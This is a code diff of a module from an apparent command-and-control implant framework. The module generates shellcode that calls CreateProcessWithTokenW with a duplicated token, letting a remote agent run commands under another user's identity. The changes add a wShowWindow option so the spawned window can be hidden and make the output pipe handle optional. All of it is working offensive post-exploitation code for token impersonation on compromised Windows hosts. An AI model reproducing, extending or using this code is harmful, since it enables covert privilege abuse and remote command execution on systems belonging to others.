@@ -2,24 +2,25 @@ NAME = "CreateProcessWithToken"
 DESCRIPTION = "Execute a command using advapi32!CreateProcessWithTokenW using a duplicated token"
 PARAMS = [
     {"name":"command_line", "description":"Command to run (UTF-16)", "type":"str"},
-    {"name":"h_pipe", "description":"Handle for stdout redirection", "type":"hex"},
     {"name":"h_token", "description":"Handle for the duplicated primary token", "type":"hex"},
+    {"name":"h_pipe", "description":"Handle for stdout redirection", "type":"hex", "optional":True, "default":0x0},
+    {"name":"show_window", "description":"Value for wShowWindow in SI struct.", "type":"hex", "optional":True, "default":0x1},
 ]
 DEPENDENCIES = []
 DEFAULT = True
-def build_si_struct(buffer_add, flags, h_pipe):
-    from services.binary import align_up
-    #printf"Creating STARTUP_INFORMATION_A structure. buffer_add={hex(buffer_add)}, flags={hex(flags)}, h_pipe={hex(h_pipe)}")
+def build_si_struct(buffer_add, flags, flags_data):
     import struct
     # hStdOutput = h_pipe, hStdError = h_pipe
-    si_data = bytearray(align_up(104, 16))
+    si_data = bytearray(104)
     struct.pack_into('<I', si_data, 0, 104)      # cb
     struct.pack_into('<I', si_data, 60, flags)   # dwFlags
-    struct.pack_into('<Q', si_data, 88, h_pipe)  # hStdOutput
-    struct.pack_into('<Q', si_data, 96, h_pipe)  # hStdError
-    return si_data, buffer_add+align_up(104, 16)
+    for i in range(len(flags_data)):
+        print(flags_data[i])
+        flag_offset, flag_size, flag_bytes = flags_data[i]
+        si_data[flag_offset:flag_offset+flag_size] = flag_bytes
+    return si_data, buffer_add+104
 
-def CreateProcessWithTokenW(agent_id,h_pipe, h_token, command_line):
+def CreateProcessWithTokenW(agent_id, command_line, h_token, h_flags, h_flags_data):
     from models.agent import Agent
     from models.syscall import Syscall
     from services.binary import build_ptr, push_rtl, align_up
@@ -42,7 +43,7 @@ def CreateProcessWithTokenW(agent_id,h_pipe, h_token, command_line):
     # 2. Build STARTUPINFOW (104 bytes)
     # Using 0x400 (STARTF_USESTDHANDLES) is common if you have pipe handles, 
     # but for simplicity, we initialize cb size.
-    si_data, cmdline_ptr = build_si_struct(si_ptr, 0x100, h_pipe)
+    si_data, cmdline_ptr = build_si_struct(si_ptr, h_flags, h_flags_data)
     
     # CreateProcessWithTokenW expects a mutable wide string
     encoded_cmd = command_line.encode('utf-16-le') + b'\x00\x00'
@@ -80,12 +81,18 @@ def function(agent_id, args):
     from services.orders import write_scratchpad, send_and_wait, read_scratchpad
     
     command = args[0]
-    h_pipe = args[1]
-    h_token = args[2] # Expected as integer/hex
+    h_token = args[1]
+    h_pipe = args[2] # Expected as integer/hex
+    wShowWindow = args[3]
 
+    flag_data = [
+        (68, 2, int.to_bytes(wShowWindow, 2, 'little')),
+        (88, 8, int.to_bytes(h_pipe, 8, 'little')),
+        (96, 8, int.to_bytes(h_pipe, 8, 'little'))
+    ]
 
     # Generate data and shellcode
-    data, shellcode = CreateProcessWithTokenW(agent_id, h_pipe, h_token, command)
+    data, shellcode = CreateProcessWithTokenW(agent_id, command, h_token, 0x100 | 0x1, flag_data)
     write_scratchpad(agent_id, data)
     
     # Execute
